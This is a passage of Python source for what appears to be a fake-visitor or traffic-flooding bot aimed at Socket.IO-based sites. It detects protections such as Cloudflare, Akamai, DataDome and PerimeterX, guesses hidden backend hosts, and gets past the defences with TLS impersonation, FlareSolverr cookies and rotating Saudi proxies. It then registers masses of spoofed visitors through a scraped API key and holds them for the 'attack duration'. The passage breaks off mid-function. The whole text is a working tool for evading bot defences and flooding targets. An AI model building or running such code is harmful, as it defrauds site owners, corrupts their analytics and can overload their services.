# ============ DETECTION ============
def verify_socketio(url):
    """Verify if a URL has a real Socket.IO endpoint. Uses curl_cffi to bypass Cloudflare."""
    # Check blacklist first - protection/analytics URLs are never Socket.IO
    if is_blacklisted_socket_url(url):
        print(f"  [SKIP] Blacklisted URL (protection/analytics): {url}", flush=True)
        return False
    try:
        sio_url = f"{url.rstrip('/')}/socket.io/?EIO=4&transport=polling"
        # Try curl_cffi first (bypasses Cloudflare)
        if HAS_CFFI:
            profile = random.choice(BROWSER_PROFILES)
            r = cffi_requests.get(sio_url, impersonate=profile["impersonate"], timeout=10)
        else:
            r = requests.get(sio_url, timeout=10)
        if r.status_code == 200 and '"sid"' in r.text and '<html' not in r.text.lower()[:200]:
            return True
        # Also try with proxy
        proxy = get_proxy_url()
        if proxy and HAS_CFFI:
            proxies = {"http": proxy, "https": proxy}
            r2 = cffi_requests.get(sio_url, impersonate=profile["impersonate"], proxies=proxies, timeout=10)
            if r2.status_code == 200 and '"sid"' in r2.text and '<html' not in r2.text.lower()[:200]:
                return True
    except:
        pass
    return False


def detect_site(url, manual_socket=None):
    """Smart detection with full protection identification."""
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    result = {
        "mode": "http",
        "socket_url": None,
        "socket_token": None,
        "pages": [],
        "has_cloudflare": False,
        "has_socketio": False,
        "has_captcha": False,
        "captcha_type": None,
        "captcha_key": None,
        "protection": "none",  # none, cloudflare, akamai, datadome, perimeterx
        "register_event": "visitor:register",
        "page_change_event": "visitor:pageEnter",
        "connected_event": "successfully-connected",
        "base_url": base,
        "target_url": url,
        "analytics": {"type": None, "id": None, "endpoint": None, "hostname": None},
    }
    
    print(f"\n[SCAN] Scanning {url}...", flush=True)
    
    # Manual socket URL - VERIFY it's a real Socket.IO server first
    if manual_socket:
        print(f"  [SOCKET] Manual Socket URL: {manual_socket}", flush=True)
        is_real_socket = verify_socketio(manual_socket)
        if is_real_socket:
            print(f"  [OK] Socket.IO verified at {manual_socket}", flush=True)
        else:
            print(f"  [WARN] Socket.IO polling blocked (Cloudflare WAF?), trusting manual URL", flush=True)
            is_real_socket = True  # Trust manual URL even if polling is blocked
        
        if is_real_socket:
            result["socket_url"] = manual_socket
            result["has_socketio"] = True
            result["mode"] = "socketio"
            result["pages"] = discover_pages(url, base)
            return result
    
    # Step 1: Probe with TLS fingerprint
    html_content = ""
    profile = random.choice(BROWSER_PROFILES)
    
    try:
        proxy = get_proxy_url()
        r = smart_request(url, profile, proxy=proxy, timeout=15)
        
        # Detect protection type from headers
        headers_lower = {k.lower(): v for k, v in dict(r.headers).items()}
        server = headers_lower.get("server", "").lower()
        
        # Cloudflare
        if any(h in headers_lower for h in ["cf-ray", "cf-cache-status", "cf-mitigated"]) or "cloudflare" in server:
            result["has_cloudflare"] = True
            result["protection"] = "cloudflare"
            print(f"  ☁️ Cloudflare detected", flush=True)
        
        # Akamai
        if "akamai" in server or "x-akamai" in " ".join(headers_lower.keys()):
            result["protection"] = "akamai"
            print(f"  🛡️ Akamai detected", flush=True)
        
        # DataDome
        if "datadome" in str(headers_lower) or "datadome" in r.text.lower():
            result["protection"] = "datadome"
            print(f"  🛡️ DataDome detected", flush=True)
        
        # PerimeterX
        if "_px" in str(r.cookies) or "perimeterx" in r.text.lower() or "px-captcha" in r.text.lower():
            result["protection"] = "perimeterx"
            print(f"  🛡️ PerimeterX detected", flush=True)
        
        if r.status_code in [403, 503]:
            if not result["protection"] or result["protection"] == "none":
                result["has_cloudflare"] = True
                result["protection"] = "cloudflare"
            print(f"  🛡️ Blocked (status {r.status_code})", flush=True)
        
        html_content = r.text
        
        # Check for CAPTCHA
        captcha = detect_captcha(html_content)
        if captcha["type"]:
            result["has_captcha"] = True
            result["captcha_type"] = captcha["type"]
            result["captcha_key"] = captcha["site_key"]
            print(f"  🔑 CAPTCHA detected: {captcha['type']}", flush=True)
        
        # Check for Socket.IO - only if we find a real backend URL AND verify it
        if r.status_code == 200:
            if "socket.io" in html_content.lower() or "io(" in html_content:
                found_result = extract_socket_url(html_content)
                if found_result:
                    found_url, found_token = found_result
                    if found_token:
                        result["socket_token"] = found_token
                    if verify_socketio(found_url):
                        result["has_socketio"] = True
                        result["socket_url"] = found_url
                        print(f"  [OK] Verified Socket.IO at {found_url}", flush=True)
                    else:
                        result["socket_url"] = found_url
                        print(f"  [WARN] Socket polling blocked but URL found: {found_url}", flush=True)
                else:
                    print(f"  [WARN] HTML mentions socket.io but no backend URL found", flush=True)
            
            # Step 1b: For SPA sites, scan JS bundles for Socket.IO backend URLs
            if not result["has_socketio"]:
                is_spa = '<div id="root"' in html_content or '<div id="app"' in html_content
                if is_spa or not result["socket_url"]:
                    js_urls = re.findall(r'src=["\']([^"\']*\.js)["\']', html_content)
                    print(f"  [PKG] SPA detected, scanning {len(js_urls)} JS bundles...", flush=True)
                    for js_path in js_urls[:5]:
                        try:
                            js_url = js_path if js_path.startswith('http') else f"{base}/{js_path.lstrip('/')}"
                            if HAS_CFFI:
                                jr = cffi_requests.get(js_url, impersonate=profile["impersonate"], timeout=15)
                            else:
                                jr = requests.get(js_url, timeout=15, headers={"User-Agent": profile["ua"]})
                            if jr.status_code == 200 and len(jr.text) > 1000:
                                # Look for Socket.IO patterns in JS
                                if 'socket.io' in jr.text.lower() or 'io(' in jr.text:
                                    js_result = extract_socket_url(jr.text)
                                    if js_result:
                                        js_socket_url, js_token = js_result
                                        if js_token:
                                            result["socket_token"] = js_token
                                        print(f"  [SOCKET] Found Socket.IO URL in JS bundle: {js_socket_url}", flush=True)
                                        if verify_socketio(js_socket_url):
                                            result["has_socketio"] = True
                                            result["socket_url"] = js_socket_url
                                            print(f"  [OK] Verified Socket.IO from JS: {js_socket_url}", flush=True)
                                            break
                                        else:
                                            result["has_socketio"] = True
                                            result["socket_url"] = js_socket_url
                                            print(f"  [SOCKET] Trusting Socket.IO from JS (polling blocked): {js_socket_url}", flush=True)
                                            break
                        except Exception as e:
                            continue
                
    except Exception as e:
        print(f"  ⚠️ Probe failed: {e}", flush=True)
        result["has_cloudflare"] = True
        result["protection"] = "cloudflare"
    
    # Step 2: Check Socket.IO on same server
    if not result["has_socketio"]:
        try:
            sio_url = f"{base}/socket.io/?EIO=4&transport=polling"
            r2 = requests.get(sio_url, timeout=10)
            # MUST verify it's a real Socket.IO handshake, not just HTML containing 'sid'
            if r2.status_code == 200 and '"sid"' in r2.text and '<html' not in r2.text.lower()[:200]:
                result["has_socketio"] = True
                result["socket_url"] = base
                print(f"  🔌 Socket.IO found at {base}", flush=True)
        except:
            pass
    
    # Step 2b: Smart Socket.IO discovery - scan for backend servers
    # When Cloudflare blocks the frontend, try to find the Socket.IO backend directly
    if not result["has_socketio"]:
        print(f"  🔍 Searching for Socket.IO backend server...", flush=True)
        domain_name = parsed.netloc.replace('www.', '').split('.')[0]  # e.g. 'aisalameh'
        
        # Common backend URL patterns to try
        backend_candidates = []
        
        # Extract hints from HTML if available (even partial/blocked HTML)
        if html_content:
            # Look for any URLs pointing to render.com, railway.app, heroku, etc
            backend_patterns = [
                r'https?://[\w.-]+\.onrender\.com',
                r'https?://[\w.-]+\.railway\.app',
                r'https?://[\w.-]+\.herokuapp\.com',
                r'https?://[\w.-]+\.vercel\.app',
                r'https?://[\w.-]+\.netlify\.app',
                r'https?://[\w.-]+\.fly\.dev',
                r'https?://[\w.-]+\.up\.railway\.app',
            ]
            for pat in backend_patterns:
                found = re.findall(pat, html_content)
                for f in found:
                    if f not in backend_candidates:
                        backend_candidates.append(f)
        
        # Try common naming patterns for the domain
        common_prefixes = [
            f"{domain_name}-server",
            f"{domain_name}-api",
            f"{domain_name}-backend",
            f"{domain_name}",
            f"api-{domain_name}",
            f"server-{domain_name}",
        ]
        common_hosts = [".onrender.com", ".railway.app", ".herokuapp.com", ".fly.dev"]
        
        for prefix in common_prefixes:
            for host_suffix in common_hosts:
                backend_candidates.append(f"https://{prefix}{host_suffix}")
        
        # Also try with common suffixes like -842m for render
        # Try to find via DNS/search common render patterns
        for candidate in backend_candidates:
            if result["has_socketio"]:
                break
            try:
                sio_test = f"{candidate.rstrip('/')}/socket.io/?EIO=4&transport=polling"
                r_test = requests.get(sio_test, timeout=8)
                if r_test.status_code == 200 and '"sid"' in r_test.text and '<html' not in r_test.text.lower()[:200]:
                    result["has_socketio"] = True
                    result["socket_url"] = candidate.rstrip('/')
                    print(f"  🔌 Socket.IO backend found: {candidate}", flush=True)
                    break
            except:
                continue
    
    # Step 3: If blocked, peek behind protection
    if result["protection"] != "none" and not result["has_socketio"]:
        print(f"  🔄 Peeking behind {result['protection']}...", flush=True)
        flare_result = solve_cloudflare_once(url)
        if flare_result:
            html_behind = flare_result.get("html", "")
            
            if "socket.io" in html_behind.lower() or "io(" in html_behind:
                found_result2 = extract_socket_url(html_behind)
                if found_result2:
                    found_url, found_token2 = found_result2
                    if found_token2:
                        result["socket_token"] = found_token2
                    try:
                        verify_url = f"{found_url.rstrip('/')}/socket.io/?EIO=4&transport=polling"
                        vr = requests.get(verify_url, timeout=8)
                        if vr.status_code == 200 and '"sid"' in vr.text and '<html' not in vr.text.lower()[:200]:
                            result["has_socketio"] = True
                            result["socket_url"] = found_url
                            print(f"  🔌 Verified Socket.IO behind protection: {found_url}", flush=True)
                    except:
                        pass
            
            # Also scan for backend URLs in the HTML (JS bundles, script tags)
            if not result["has_socketio"]:
                backend_urls = re.findall(r'https?://[\w.-]+\.(?:onrender\.com|railway\.app|herokuapp\.com|fly\.dev)', html_behind)
                for bu in backend_urls:
                    try:
                        test_url = f"{bu}/socket.io/?EIO=4&transport=polling"
                        rt = requests.get(test_url, timeout=8)
                        if rt.status_code == 200 and '"sid"' in rt.text and '<html' not in rt.text.lower()[:200]:
                            result["has_socketio"] = True
                            result["socket_url"] = bu
                            print(f"  🔌 Socket.IO backend found in HTML: {bu}", flush=True)
                            break
                    except:
                        continue
            
            # Scan JS bundle files for backend URLs
            if not result["has_socketio"]:
                js_urls = re.findall(r'src=["\']([^"\'/][^"\']*.js)["\']', html_behind)
                for js_path in js_urls[:10]:
                    try:
                        js_url = js_path if js_path.startswith('http') else f"{base}/{js_path.lstrip('/')}"
                        # Use FlareSolverr cookies to fetch JS
                        cookies = flare_result.get("cookies", {})
                        ua = flare_result.get("user_agent", "")
                        jr = requests.get(js_url, cookies=cookies, headers={"User-Agent": ua}, timeout=15)
                        if jr.status_code == 200:
                            js_backends = re.findall(r'https?://[\w.-]+\.(?:onrender\.com|railway\.app|herokuapp\.com|fly\.dev)', jr.text)
                            for jb in js_backends:
                                try:
                                    test_url = f"{jb}/socket.io/?EIO=4&transport=polling"
                                    rt2 = requests.get(test_url, timeout=8)
                                    if rt2.status_code == 200 and '"sid"' in rt2.text and '<html' not in rt2.text.lower()[:200]:
                                        result["has_socketio"] = True
                                        result["socket_url"] = jb
                                        print(f"  🔌 Socket.IO backend found in JS bundle: {jb}", flush=True)
                                        break
                                except:
                                    continue
                        if result["has_socketio"]:
                            break
                    except:
                        continue
            
            with cf_cookie_cache["lock"]:
                cf_cookie_cache["cookies"] = flare_result["cookies"]
                cf_cookie_cache["user_agent"] = flare_result["user_agent"]
                cf_cookie_cache["timestamp"] = time.time()
                cf_cookie_cache["valid"] = True
            
            html_content = html_behind
    
    # Step 3b: If still no Socket.IO and Cloudflare blocked, try curl_cffi with proxy
    if result["protection"] != "none" and not result["has_socketio"]:
        print(f"  🔄 Trying curl_cffi with proxy to bypass {result['protection']}...", flush=True)
        if HAS_CFFI:
            for attempt in range(3):
                try:
                    proxy = get_proxy_url()
                    profile = random.choice(BROWSER_PROFILES)
                    headers = get_browser_headers(profile)
                    proxies = {"http": proxy, "https": proxy} if proxy else None
                    r_cffi = cffi_requests.get(url, impersonate=profile["impersonate"],
                                              headers=headers, proxies=proxies, timeout=20)
                    if r_cffi.status_code == 200 and not is_cf_blocked(r_cffi):
                        html_cffi = r_cffi.text
                        # Look for socket.io references
                        if "socket.io" in html_cffi.lower() or "io(" in html_cffi:
                            found_url = extract_socket_url(html_cffi)
                            if found_url:
                                try:
                                    verify_url = f"{found_url.rstrip('/')}/socket.io/?EIO=4&transport=polling"
                                    vr = requests.get(verify_url, timeout=8)
                                    if vr.status_code == 200 and '"sid"' in vr.text and '<html' not in vr.text.lower()[:200]:
                                        result["has_socketio"] = True
                                        result["socket_url"] = found_url
                                        print(f"  🔌 Verified Socket.IO via curl_cffi: {found_url}", flush=True)
                                except:
                                    pass
                        # Scan for backend URLs
                        backend_urls = re.findall(r'https?://[\w.-]+\.(?:onrender\.com|railway\.app|herokuapp\.com|fly\.dev)', html_cffi)
                        for bu in backend_urls:
                            try:
                                test_url = f"{bu}/socket.io/?EIO=4&transport=polling"
                                rt = requests.get(test_url, timeout=8)
                                if rt.status_code == 200 and '"sid"' in rt.text and '<html' not in rt.text.lower()[:200]:
                                    result["has_socketio"] = True
                                    result["socket_url"] = bu
                                    print(f"  🔌 Socket.IO backend found via curl_cffi: {bu}", flush=True)
                                    break
                            except:
                                continue
                        # Also try to fetch JS bundles
                        if not result["has_socketio"]:
                            js_urls = re.findall(r'src=["\']([^"\'/][^"\']*.js)["\']', html_cffi)
                            for js_path in js_urls[:5]:
                                try:
                                    js_url = js_path if js_path.startswith('http') else f"{base}/{js_path.lstrip('/')}"
                                    jr = cffi_requests.get(js_url, impersonate=profile["impersonate"],
                                                          headers=headers, proxies=proxies, timeout=15)
                                    if jr.status_code == 200:
                                        js_backends = re.findall(r'https?://[\w.-]+\.(?:onrender\.com|railway\.app|herokuapp\.com|fly\.dev)', jr.text)
                                        for jb in js_backends:
                                            try:
                                                test_url = f"{jb}/socket.io/?EIO=4&transport=polling"
                                                rt2 = requests.get(test_url, timeout=8)
                                                if rt2.status_code == 200 and '"sid"' in rt2.text and '<html' not in rt2.text.lower()[:200]:
                                                    result["has_socketio"] = True
                                                    result["socket_url"] = jb
                                                    print(f"  🔌 Socket.IO backend found in JS: {jb}", flush=True)
                                                    break
                                            except:
                                                continue
                                    if result["has_socketio"]:
                                        break
                                except:
                                    continue
                        if result["has_socketio"]:
                            break
                except Exception as e:
                    print(f"  ⚠️ curl_cffi attempt {attempt+1}: {e}", flush=True)
                    continue
    
    # Step 4: Verify Socket.IO
    if result["socket_url"] and not result["has_socketio"]:
        try:
            sio_url = f"{result['socket_url']}/socket.io/?EIO=4&transport=polling"
            r3 = requests.get(sio_url, timeout=10)
            if r3.status_code == 200 and '"sid"' in r3.text and '<html' not in r3.text.lower()[:200]:
                result["has_socketio"] = True
        except:
            pass
    
    # Step 5: Determine mode (HYBRID - auto-select best strategy)
    # Strong protections → browser mode (real Chrome, persistent visitors)
    # Weak/no protection → curl_cffi (fast, high volume)
    STRONG_PROTECTIONS = ["datadome", "kasada", "perimeterx", "shape"]
    MEDIUM_PROTECTIONS = ["cloudflare", "akamai", "imperva"]
    
    # Validate Socket.IO URL against blacklist before using it
    if result["has_socketio"] and result["socket_url"]:
        if is_blacklisted_socket_url(result["socket_url"]):
            print(f"  [FIX] Socket URL is blacklisted (protection service): {result['socket_url']}", flush=True)
            result["has_socketio"] = False
            result["socket_url"] = None
    
    # Socket.IO should NOT override strong protections
    if result["has_socketio"] and result["protection"] not in STRONG_PROTECTIONS:
        result["mode"] = "socketio"
        if not result["socket_url"]:
            result["socket_url"] = base
    elif result["protection"] in STRONG_PROTECTIONS:
        # Always use browser for extreme protections - even if Socket.IO found
        result["mode"] = "browser"
        print(f"  [MODE] Browser mode forced for {result['protection']} protection", flush=True)
    elif result["protection"] in MEDIUM_PROTECTIONS:
        # For Cloudflare/Akamai: use browser mode (most reliable)
        result["mode"] = "browser"
        result["browser_fallback"] = True
        print(f"  [MODE] Browser mode for {result['protection']} protection", flush=True)
    else:
        result["mode"] = "browser"
    
    # Step 6: Discover pages
    result["pages"] = discover_pages(url, base, html_content)
    
    # Step 7: Detect analytics (NEW - for admin panel visibility)
    result["analytics"] = detect_analytics(html_content)
    result["analytics"]["hostname"] = parsed.netloc
    if result["analytics"]["type"]:
        print(f"  📊 Analytics detected: {result['analytics']['type']} (ID: {result['analytics']['id']})", flush=True)
    
    print(f"\n📋 Detection result:", flush=True)
    print(f"  Mode: {result['mode']}", flush=True)
    print(f"  Protection: {result['protection']}", flush=True)
    print(f"  Socket URL: {result['socket_url']}", flush=True)
    print(f"  CAPTCHA: {result['captcha_type']}", flush=True)
    print(f"  TLS Spoof: {'Yes' if HAS_CFFI else 'No'}", flush=True)
    print(f"  Analytics: {result['analytics']['type'] or 'none'}", flush=True)
    print(f"  Pages: {len(result['pages'])}", flush=True)
    
    return result


def extract_socket_url(html):
    """Extract Socket.IO server URL and optional auth token from HTML/JS source.
    Returns: (url, token) tuple or (url, None) or None"""
    
    # First try to find URL+token pair (Nexa Flow pattern: "URL",VAR="TOKEN")
    token_pattern = r'"(https?://[\w.-]+\.[a-z]{2,})",\w+="([\w]{20,})"'
    token_matches = re.findall(token_pattern, html)
    for url_m, tok_m in token_matches:
        if url_m.startswith("http") and "socket.io" not in url_m and "cdn" not in url_m.lower():
            skip = ['google', 'facebook', 'twitter', 'apple.com', 'play.google', 'flagcdn',
                    'fonts.', 'github', 'wikipedia', 'w3.org', 'apache.org', 'reactjs',
                    'mui.com', 'radix-ui', 'mediawiki']
            if any(s in url_m.lower() for s in skip):
                continue
            # Check blacklist - protection/analytics URLs are NOT Socket.IO
            if is_blacklisted_socket_url(url_m):
                print(f"  [SKIP] Blacklisted URL (protection/analytics): {url_m}", flush=True)
                continue
            print(f"  [LINK] Found socket URL: {url_m} (with token)", flush=True)
            return (url_m, tok_m)
    
    # Then try URL-only patterns
    for pattern in [
        r'(?:const|let|var)\s+\w*(?:SOCKET|socket|server|api|SERVER|API)\w*\s*=\s*[\'"]([\'"])+[\'"]',
        r'io\([\'"]([\'"])+[\'"]',
        r'connect\([\'"]([\'"])+[\'"]',
        r'socketUrl\s*[:=]\s*[\'"]([\'"])+[\'"]',
        r'SOCKET_URL\s*[:=]\s*[\'"]([\'"])+[\'"]',
        r'serverUrl\s*[:=]\s*[\'"]([\'"])+[\'"]',
    ]:
        matches = re.findall(pattern, html)
        for m in matches:
            if m.startswith("http") and "socket.io" not in m and "cdn" not in m.lower():
                skip = ['google', 'facebook', 'twitter', 'apple.com', 'play.google', 'flagcdn',
                        'fonts.', 'github', 'wikipedia', 'w3.org', 'apache.org', 'reactjs',
                        'mui.com', 'radix-ui', 'mediawiki']
                if any(s in m.lower() for s in skip):
                    continue
                # Check blacklist
                if is_blacklisted_socket_url(m):
                    print(f"  [SKIP] Blacklisted URL (protection/analytics): {m}", flush=True)
                    continue
                print(f"  [LINK] Found socket URL: {m}", flush=True)
                return (m, None)
    return None


def discover_pages(url, base, html_content=""):
    """Try to find pages/paths from the website."""
    pages = ["/"]
    try:
        proxy = get_proxy_url()
        proxies = {"http": proxy, "https": proxy} if proxy else None
        
        for sitemap_path in ["/sitemap.xml", "/sitemap_index.xml"]:
            try:
                r = requests.get(base + sitemap_path, proxies=proxies, timeout=10,
                               headers={"User-Agent": random.choice(BROWSER_PROFILES)["ua"]})
                if r.status_code == 200 and "<loc>" in r.text:
                    locs = re.findall(r"<loc>([^<]+)</loc>", r.text)
                    for loc in locs[:20]:
                        path = urlparse(loc).path or "/"
                        if path not in pages:
                            pages.append(path)
            except:
                pass
        
        try:
            r = requests.get(base + "/robots.txt", proxies=proxies, timeout=10,
                           headers={"User-Agent": random.choice(BROWSER_PROFILES)["ua"]})
            if r.status_code == 200:
                for line in r.text.split("\n"):
                    if "allow:" in line.lower():
                        path = line.split(":", 1)[1].strip()
                        if path and path != "/" and not path.startswith("*") and path not in pages:
                            pages.append(path)
        except:
            pass
        
        source = html_content
        if not source:
            try:
                r = requests.get(url, proxies=proxies, timeout=15,
                               headers={"User-Agent": random.choice(BROWSER_PROFILES)["ua"]})
                if r.status_code == 200:
                    source = r.text
            except:
                pass
        
        if source:
            hrefs = re.findall(r'href=["\']([^"\']+)["\']', source)
            for href in hrefs:
                if href.startswith("/") and not href.startswith("//"):
                    if href not in pages and len(pages) < 30:
                        pages.append(href)
                elif href.startswith(base):
                    path = urlparse(href).path or "/"
                    if path not in pages and len(pages) < 30:
                        pages.append(path)
    except:
        pass
    
    if len(pages) < 3:
        pages.extend(["/", "/about", "/contact", "/services", "/faq"])
    
    return list(set(pages))[:20]


# ============ MODE A: SOCKET.IO ============
def visitor_socketio(site_info, vid):
    """Connect via Socket.IO through unique Saudi proxy."""
    try:
        import socketio as sio_lib
    except ImportError:
        os.system("pip3 install 'python-socketio[client]' websocket-client -q 2>/dev/null")
        import socketio as sio_lib
    
    fp, profile = gen_fingerprint()
    fp["page"] = random.choice(site_info["pages"]) if site_info["pages"] else "/"
    
    # ALWAYS use proxy for Socket.IO to avoid rate limiting per VPS IP
    socket_url = site_info["socket_url"]
    
    # Use ONE proxy session for both registration and Socket.IO
    http_session = None
    proxy_url = get_proxy_url()  # generates unique session
    if proxy_url:
        http_session = requests.Session()
        http_session.proxies = {"http": proxy_url, "https": proxy_url}
    
    # If socket server is behind Cloudflare, pass CF cookies to the session
    if cf_cookie_cache["valid"] and cf_cookie_cache["cookies"]:
        if http_session is None:
            http_session = requests.Session()
        http_session.cookies.update(cf_cookie_cache["cookies"])
        if cf_cookie_cache["user_agent"]:
            http_session.headers["User-Agent"] = cf_cookie_cache["user_agent"]
    
    # Set browser-like headers for Socket.IO
    if http_session:
        http_session.headers.setdefault("Origin", site_info.get("base_url", ""))
        http_session.headers.setdefault("Referer", site_info.get("base_url", "") + "/")
    
    # Disable SSL verification for proxied connections
    if http_session:
        http_session.verify = False
    
    sio = sio_lib.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=1, reconnection_delay_max=5, http_session=http_session, request_timeout=120, ssl_verify=False)
    connected = threading.Event()
    registered = threading.Event()
    
    @sio.event
    def connect():
        connected.set()
        # Send register with correct format: {existingVisitorId: null}
        try:
            sio.emit(site_info["register_event"], {"existingVisitorId": None})
        except: pass
    
    @sio.on(site_info["connected_event"])
    def on_ok(data):
        registered.set()
        # Send initial page enter after registration
        page = random.choice(site_info["pages"]) if site_info["pages"] else "/"
        try:
            sio.emit(site_info["page_change_event"], page)
        except: pass
    
    @sio.on("*")
    def catch_all(event, data): pass
    
    @sio.event
    def disconnect(): pass
    
    try:
        # Build auth dict - for Nexa Flow sites, register visitor first to get JWT
        auth_dict = None
        visitor_jwt = None
        if site_info.get("socket_token"):
            # Nexa Flow: register visitor via HTTP API first (retry up to 3 times with different proxy sessions)
            reg_headers = {
                "Content-Type": "application/json",
                "nf-api-key": site_info["socket_token"],
                "Origin": site_info.get("base_url", ""),
                "Referer": site_info.get("base_url", "") + "/"
            }
            os_choices = ["Windows", "macOS", "Linux", "Android", "iOS"]
            browser_choices = ["Chrome", "Firefox", "Safari", "Edge"]
            device_choices = ["desktop", "mobile", "tablet"]
            reg_body = {
                "deviceInfo": {
                    "os": random.choice(os_choices),
                    "device": random.choice(device_choices),
                    "browser": random.choice(browser_choices)
                },
                "currentPage": random.choice(site_info["pages"]) if site_info["pages"] else "/"
            }
            last_fail_reason = ""
            for _attempt in range(5):
                try:
                    # Generate fresh proxy session each attempt
                    attempt_proxy = get_proxy_url()
                    if HAS_CFFI:
                        reg_proxies = {"http": attempt_proxy, "https": attempt_proxy} if attempt_proxy else None
                        reg_r = cffi_requests.post(
                            site_info["socket_url"] + "/visitors",
                            json=reg_body, headers=reg_headers,
                            impersonate=random.choice(["chrome120", "chrome119", "chrome116"]),
                            proxies=reg_proxies, timeout=15, verify=False
                        )
                    else:
                        reg_proxies_dict = {"http": attempt_proxy, "https": attempt_proxy} if attempt_proxy else None
                        reg_r = requests.post(
                            site_info["socket_url"] + "/visitors",
                            json=reg_body, headers=reg_headers, timeout=15, verify=False,
                            proxies=reg_proxies_dict
                        )
                    if reg_r.status_code == 429:
                        last_fail_reason = "429"
                        # Rate limited - longer exponential backoff to let limit reset
                        wait = random.uniform(10 + _attempt * 5, 20 + _attempt * 8)
                        time.sleep(wait)
                        continue
                    if reg_r.status_code == 403:
                        last_fail_reason = "403"
                        time.sleep(random.uniform(1, 3))
                        continue
                    if reg_r.status_code >= 500:
                        last_fail_reason = f"{reg_r.status_code}"
                        time.sleep(random.uniform(2, 5))
                        continue
                    if reg_r.status_code in [200, 201]:
                        reg_data = reg_r.json()
                        # Verify the IP is actually Saudi
                        materials = reg_data.get("materials", {})
                        ip_country = materials.get("country", "")
                        if ip_country != "SA":
                            last_fail_reason = f"country:{ip_country or 'none'}"
                            # Not Saudi IP or unknown country, try another proxy session
                            continue
                        visitor_jwt = reg_data.get("token")
                        # Lock in the successful Saudi proxy for Socket.IO too
                        proxy_url = attempt_proxy
                        if proxy_url and http_session:
                            http_session.proxies = {"http": proxy_url, "https": proxy_url}
                        break
                    else:
                        last_fail_reason = f"http:{reg_r.status_code}"
                except Exception as e:
                    last_fail_reason = f"err:{type(e).__name__}"
                    time.sleep(random.uniform(1, 3))
            
            if visitor_jwt:
                auth_dict = {"nf-api-key": site_info["socket_token"], "token": visitor_jwt}
            else:
                # No JWT = cannot authenticate, skip this visitor
                with lock: stats["failed"] += 1
                log_progress(last_fail_reason or "no_jwt")
                return False
        
        # Connect via websocket (bypasses Cloudflare WAF)
        # With reconnection=True, the client will auto-reconnect if the first WS drops
        try:
            sio.connect(site_info["socket_url"], auth=auth_dict, transports=['websocket'], wait_timeout=30)
        except:
            pass  # reconnection will handle it
        
        # Wait for connection (may take a few seconds due to initial drop + reconnect)
        if not connected.wait(timeout=20):
            with lock: stats["failed"] += 1
            log_progress("ws_timeout")
            try: sio.disconnect()
            except: pass
            return False
        
        # Wait for server to confirm registration
        if not registered.wait(timeout=15):
            # Still count as success if connected - registration might be delayed
            pass
        
        with lock:
            stats["success"] += 1
            stats["active_visitors"] += 1
            stats["unique_ips"] += 1
            if stats["active_visitors"] > stats["peak_active"]:
                stats["peak_active"] = stats["active_visitors"]
        log_progress()
        
        # Stay for the FULL attack duration so visitors accumulate over time
        # Use duration_min from stats (set by run()) to keep visitor alive the entire attack
        full_duration = stats.get("duration_min", 5) * 60  # convert minutes to seconds
        effective_stay = max(full_duration, STAY_TIME) if PROXY_USER else STAY_TIME
        stay = effective_stay + random.randint(-10, 10)
        end_time = time.time() + max(stay, 15)
        
        # Realistic browsing: change pages every 15-45 seconds like a real user
        pages = site_info["pages"] if site_info["pages"] else ["/"]
        while time.time() < end_time and not stop_event.is_set():
            # Random delay between page views (realistic browsing behavior)
            time.sleep(random.uniform(15, 45))
            if time.time() >= end_time or stop_event.is_set(): break
            try:
                if sio.connected:
                    new_page = random.choice(pages)
                    sio.emit(site_info["page_change_event"], new_page)
            except: pass  # Don't break on emit errors, let reconnection handle it
        
        try: sio.disconnect()
        except: pass
        with lock: stats["active_visitors"] -= 1
        return True
        
    except Exception as e:
        with lock: stats["failed"] += 1
        log_progress(f"exception:{type(e).__name__}")
        try: sio.disconnect()
        except: pass
        return False


# ============ MODE B: PROTECTED SITES (Cloudflare/Akamai/DataDome/PerimeterX) ============
def visitor_cloudflare(site_info, vid):
    """Smart bypass for all protection types using TLS spoofing + shared cookies."""
    with cf_cookie_cache["lock"]:
        mode = cf_cookie_cache["mode"]
        cookies = cf_cookie_cache["cookies"].copy()
        ua = cf_cookie_cache["user_agent"]
        valid = cf_cookie_cache["valid"]
    
    if mode == "shared" and valid and cookies:
        return visitor_protected_shared(site_info, vid, cookies, ua)
    else:
        return visitor_protected_per_proxy(site_info, vid)


def visitor_protected_shared(site_info, vid, cookies, ua):
    """Use shared cookies + TLS spoofing + unique proxy = FAST mode."""
    url = site_info["target_url"]
    proxy = get_proxy_url()
    fp, profile = gen_fingerprint()
    
    try:
        r = smart_request(url, profile, proxy=proxy, cookies=cookies, timeout=15)
        
        # ADVANCED VERIFICATION: Check if we actually reached real content
        success, reason = verify_visit_response(r)
        
        if not success:
            # Check if it's a cookie failure (need to switch to per-proxy)
            if reason.startswith("blocked:") or reason.startswith("status_") or reason == "cf_challenge_page":
                with cf_cookie_cache["lock"]:
                    cf_cookie_cache["fail_count"] += 1
                    if cf_cookie_cache["fail_count"] >= 3:
                        print(f"  ⚠️ Shared cookies failing ({reason}), switching to per-proxy", flush=True)
                        cf_cookie_cache["mode"] = "per_proxy"
                with lock: stats["blocked_visitors"] += 1
                return visitor_protected_per_proxy(site_info, vid)
            else:
                with lock:
                    stats["failed"] += 1
                    stats["blocked_visitors"] += 1
                log_progress(f"verify_fail:{reason[:25]}")
                return False
        
        # VERIFIED SUCCESS - visitor actually reached real content
        with lock:
            stats["success"] += 1
            stats["active_visitors"] += 1
            stats["verified_visitors"] += 1
            stats["unique_ips"] += 1
            if stats["active_visitors"] > stats["peak_active"]:
                stats["peak_active"] = stats["active_visitors"]
            if stats["verified_visitors"] > stats["peak_verified"]:
                stats["peak_verified"] = stats["verified_visitors"]
        log_progress()
        
        # Simulate browsing with TLS spoofing
        stay = STAY_TIME + random.randint(-5, 5)
        end_time = time.time() + max(stay, 15)
        
        while time.time() < end_time and not stop_event.is_set():
            time.sleep(random.uniform(3, 8))
            if time.time() >= end_time or stop_event.is_set(): break
            page = random.choice(site_info["pages"]) if site_info["pages"] else "/"
            try:
                smart_request(site_info["base_url"] + page, profile, proxy=proxy, 
                            cookies=cookies, timeout=10)
            except: pass
        
        with lock:
            stats["active_visitors"] -= 1
            stats["verified_visitors"] -= 1
        return True
            
    except Exception as e:
        with lock: stats["failed"] += 1
        log_progress()
        return False


def visitor_protected_per_proxy(site_info, vid):
    """Per-proxy bypass: curl_cffi TLS spoof per visitor OR FlareSolverr fallback."""
    url = site_info["target_url"]
    proxy = get_proxy_url()
    fp, profile = gen_fingerprint()
    
